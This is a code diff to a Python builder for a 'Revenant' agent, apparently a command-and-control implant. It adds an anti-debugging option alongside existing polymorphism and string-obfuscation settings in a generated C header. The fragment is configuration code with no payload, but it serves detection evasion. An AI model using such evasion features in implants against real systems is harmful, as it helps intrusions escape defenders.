@@ -183,7 +183,8 @@ def process_config_h(config: dict):
     config_poly:               str = str(config['Config']['Polymorphic'])
     config_obf_strings:        str = str(config['Config']['Obfuscation'])
     config_arch:               str = config['Options']['Arch']
-    config_native:             str = config['Config']['Native']
+    config_native:             str = str(config['Config']['Native'])
+    config_anti_debug:         str = str(config['Config']['AntiDebug'])
 
     header_file = f'''
 #define CONFIG_USER_AGENT L"{config_user_agent}"
@@ -195,6 +196,7 @@ def process_config_h(config: dict):
 #define CONFIG_OBFUSCATION {str(config_obf_strings).upper()}
 #define CONFIG_ARCH {config_arch}  
 #define CONFIG_NATIVE {config_native}
+#define CONFIG_ANTI_DEBUG {config_anti_debug}
     '''
 
     for filepath in glob.iglob('**/Config.h', recursive=True):
@@ -313,7 +315,8 @@ class Revenant(AgentType):
             "Sleep": "10",
             "Polymorphic": True,
             "Obfuscation": True,
-            "Native"    : True
+            "Native"    : True,
+            "AntiDebug" : True
         }
         self.Commands: list = [
             CommandShell(),
